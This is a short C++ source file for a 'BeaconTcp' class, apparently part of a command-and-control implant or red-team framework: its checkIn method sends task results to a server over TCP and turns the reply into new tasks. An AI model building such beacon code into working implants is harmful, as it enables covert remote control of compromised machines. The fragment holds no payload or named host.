#include "BeaconTcp.hpp"

using namespace std;
using namespace SocketHandler;


BeaconTcp::BeaconTcp(std::string& ip, int port)
	: Beacon(ip, port)
{
	m_client=new Client(m_ip, m_port);
}


BeaconTcp::~BeaconTcp()
{
}


void BeaconTcp::checkIn()
{	
	std::string output;
	taskResultsToCmd(output);

	m_client->sendData(output);

	string input;
	m_client->receive(input);

	if(!input.empty())
	{
		cmdToTasks(input);
	}
}

